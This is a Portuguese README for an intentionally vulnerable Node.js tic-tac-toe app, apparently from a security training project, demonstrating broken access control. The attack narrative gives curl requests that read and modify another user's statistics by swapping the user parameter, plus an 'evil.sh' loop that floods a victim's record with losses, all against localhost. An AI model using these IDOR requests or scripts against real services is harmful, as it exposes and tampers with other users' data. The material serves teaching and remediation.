# Tic-Tac-Toe

<p align="center"><img  src="images/a5-banner.png"/></br>
    <a href="README.md"><img height="24" title="Access content in English" src="https://img.shields.io/badge/Access%20content%20in-English-blue"/></a></p>

Tic-Tac-Toe é um aplicativo web simples do Nodejs que contém um exemplo de uma vulnerabilidade de controle de acesso quebrado e seu principal objetivo é descrever como um usuário mal-intencionado pode explorá-lo.

## Index

- [Definição](#o-que-é-quebra-de-controle-de-acesso)
- [Como inicializar o aplicativo?](#como-inicializar-o-aplicativo)
- [Narrativa de ataque](#narrativa-de-ataque)
- [Objetivos](#proteger-este-aplicativo)
- [Soluções](#pr-soluções)
- [Contribuição](#contribuição)

## O que é quebra de controle de acesso?

As restrições sobre o que os usuários autenticados podem fazer geralmente não são aplicadas corretamente.

Os invasores podem explorar essas falhas para acessar funcionalidades e/ou dados não autorizados, como acessar a contas de outros usuários, visualizar arquivos confidenciais, modificar dados de outros usuários, alterar direitos de acesso, etc.

O principal objetivo deste aplicativo é discutir como as vulnerabilidades do **Quebra de Controle de Acesso** podem ser exploradas e incentivar os desenvolvedores a enviar solicitações pull no **SecDevLabs** sobre como eles corrigiriam essas falhas.

## Setup

Para iniciar este aplicativo **intencionalmente inseguro**, você precisará do [Docker][Docker Install] e do [Docker Compose][Docker Compose Install]. Depois de clonar o repositório [secDevLabs](https://github.com/globocom/secDevLabs), no seu computador, você deve digitar os seguintes comandos para iniciar o aplicativo:

```sh

cd secDevLabs/owasp-top10-2021-apps/a1/tictactoe

```

```sh

make install

```

Depois é só visitar [http://localhost.:10005][app] ! 😆

## Conheça o app 🕹

Para entender corretamente como esse aplicativo funciona, você pode seguir esse passo a passo:

- Registrar um usuário;
- Realizar um login;
- Jogue o jogo;
- Veja as estatística.

## Narrativa de ataque

Agora que você conhece o propósito deste aplicativo, o que pode dar errado? A seção a seguir descreve como um invasor pode identificar e, eventualmente, encontrar informações confidenciais sobre o aplicativo ou seus usuários. Recomendamos que você siga estas etapas e tente reproduzi-las por conta própria para entender melhor o ataque! 😜

#### A falta de validação de cookies do usuário permite que um invasor obtenha estatísticas de jogos de outros usuários.

### 👀

Para entender melhor como a aplicação trata seus dados, dois usuários, `user1` e `user2`, podem ser criados usando a interface web visitando [http://locahost.:10005/create](http://localhost :.10005/create) conforme exemplificado abaixo: 

<p  align="center"><img  src="images/attack0.png"/></p>

Após fazer login como `user1` e jogar algumas vezes, suas estatísticas podem ser verificadas visitando [http://localhost.:10005/statistics](http://localhost.:10005/statistics), conforme o seguinte imagem mostra:

<p  align="center"><img  src="images/attack1.png"/></p>

Para verificar como essas informações estão sendo recuperadas do servidor, um invasor pode usar as Ferramentas do desenvolvedor do Firefox usando `Ctrl + Shift + E` ou `Command + Option + E` em um Mac, conforme mostrado abaixo:

<p  align="center"><img  src="images/attack3.png"/></p>

Você pode replicar este GET usando o seguinte comando curl (use seu próprio token `tictacsession`):

```sh
curl -s 'GET' -b 'tictacsession=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIxIiwiaWF0IjoxNTYzNDcyODg2LCJleHAiOjE1NjM0NzY0ODZ9.ESLVZ9bbfUbUdFBFRCzxGTPICuaEWdGLxrvWykEmhNk' 'http://localhost.:10005/statistics/data?user=user1'
```

```json
{
  "chartData": [
    { "y": 46.15384615384615, "label": "Wins" },
    { "y": 15.384615384615385, "label": "Ties" },
    { "y": 38.46153846153846, "label": "Loses" }
  ],
  "numbers": { "games": 13, "wins": 6, "ties": 2, "loses": 5 }
}
```

### 🔥

Como esta solicitação AJAX está sendo feita passando o nome de usuário como parâmetro de URL, pode indicar que somente este parâmetro está sendo utilizado para verificar a permissão para obter os dados. Para verificar isso, usando a mesma `tictacsession`, um invasor pode substituir `user1` por outro usuário conhecido, como `user2` por exemplo:

```sh
curl -s 'GET' -b 'tictacsession=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIxIiwiaWF0IjoxNTYzNDcyODg2LCJleHAiOjE1NjM0NzY0ODZ9.ESLVZ9bbfUbUdFBFRCzxGTPICuaEWdGLxrvWykEmhNk' 'http://localhost.:10005/statistics/data?user=user2'
```

```json
{
  "chartData": [
    { "y": 100, "label": "Wins" },
    { "y": 0, "label": "Ties" },
    { "y": 0, "label": "Loses" }
  ],
  "numbers": { "games": 1, "wins": 1, "ties": 0, "loses": 0 }
}
```

Este fato representa uma vulnerabilidade da `Quebra de controle de acesso`, permitindo que um invasor veja as estatísticas privadas de todos os usuários conhecidos.

#### A falta de validação de cookies do usuário permite que um invasor manipule as estatísticas do usuário

### 👀

Usando a mesma metodologia, um invasor agora pode verificar o que o aplicativo faz quando um jogo termina e tenta armazenar o resultado. Analisando o inspencionar do navegador mais uma vez revela que foi feito um POST para a rota `/game`, como pode ser visto na imagem a seguir:

<p  align="center"><img  src="images/attack4.png"/></p>

Essa solicitação é feita usando dois parâmetros, `user` e `result`, conforme mostrado abaixo:

<p  align="center"><img  src="images/attack5.png"/></p>

Para replicar este POST usando o comando curl (use seu próprio token `tictacsession`), você pode digitar o seguinte comando:

```sh
curl -s 'POST' -b 'tictacsession=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIxIiwiaWF0IjoxNTYzNDc5MzIxLCJleHAiOjE1NjM0ODI5MjF9.SRVz09ZebGa875MilaV2bj4tjAdTWA14JTuArnUDOZM' 'http://localhost.:10005/game' --data-binary 'user=user1&result=win'
```

```json
OK
```

### 🔥

Um invasor agora pode verificar se, usando outro nome de usuário nessa solicitação, ele pode modificar as estatísticas de outro usuário. Para isso, o parâmetro `user` é alterado para outro usuário conhecido, como `user2` por exemplo:

```sh
curl -s 'POST' -b 'tictacsession=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIxIiwiaWF0IjoxNTYzNDc5MzIxLCJleHAiOjE1NjM0ODI5MjF9.SRVz09ZebGa875MilaV2bj4tjAdTWA14JTuArnUDOZM' 'http://localhost.:10005/game' --data-binary 'user=user2&result=win'
```

```json
OK
```

Imaginando o pior cenário, um invasor poderia criar um script malicioso para enviar essa mesma solicitação quantas vezes pudesse, como pode ser exemplificado abaixo:

```sh
vi evil.sh
```

```sh
#!/bin/sh
#
# evil.sh - Add 100 losses to an user!

user="user2"
num=100
result="lose"
tictacsession="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIxIiwiaWF0IjoxNTYzNDc5MzIxLCJleHAiOjE1NjM0ODI5MjF9.SRVz09ZebGa875MilaV2bj4tjAdTWA14JTuArnUDOZM"

for i in `seq 1 $num`; do
    curl -s 'POST' -b "tictacsession=$tictacsession" 'http://localhost.:10005/game' --data-binary "user=$user&result=$result"
done
```

E execute:

```sh
chmod +x evil.sh && ./evil.sh
```

```sh
OKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOKOK
```

Para verificar se esse ataque realmente funcionou, o usuário mal-intencionado pode explorar a vulnerabilidade anterior para verificar as estatísticas do `user2` usando o seguinte comando:

```sh
curl -s 'GET' -b 'tictacsession=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIxIiwiaWF0IjoxNTYzNDc5MzIxLCJleHAiOjE1NjM0ODI5MjF9.SRVz09ZebGa875MilaV2bj4tjAdTWA14JTuArnUDOZM' 'http://localhost.:10005/statistics/data?user=user2'
```

```json
{
  "chartData": [
    { "y": 3.6363636363636362, "label": "Wins" },
    { "y": 2.727272727272727, "label": "Ties" },
    { "y": 93.63636363636364, "label": "Loses" }
  ],
  "numbers": { "games": 110, "wins": 4, "ties": 3, "loses": 103 }
}
```

Mais uma vez, este fato representa uma vulnerabilidade da `Quebra de controle de acesso`, permitindo que um invasor modifique as estatísticas privadas de cada usuário conhecido.

## Proteger este aplicativo

Como você arrumaria essa vulnerabilidade? Após suas alterações, um invasor não poderá:

- Acessar as estatísticas privadas de outros usuários;
- Modifique as estatísticas privadas de outros usuários.

## PR Soluções

[Alerta de spoiler 🚨 ] Para entender como essa vulnerabilidade pode ser resolvida, confira [esses pull requests](https://github.com/globocom/secDevLabs/pulls?utf8=%E2%9C%93&q=is%3Apr+label%3A%22mitigation+solution+%F0%9F%94%92%22+label%3A%22Tic-Tac-Toe%22)!

## Contribuição

Nós encorajamos você a contribuir com o SecDevLabs! Por favor, confira a seção [Contribuição no SecDevLabs](../../../docs/CONTRIBUTING.md) de como fazer a sua contribuição!🎉 🎉

[docker install]: https://docs.docker.com/install/
[docker compose install]: https://docs.docker.com/compose/install/
[app]: http://localhost.:10005
[secdevlabs]: https://github.com/globocom/secDevLabs
[2]: https://github.com/globocom/secDevLabs/tree/master/owasp-top10-2021-apps/a1/tictactoe
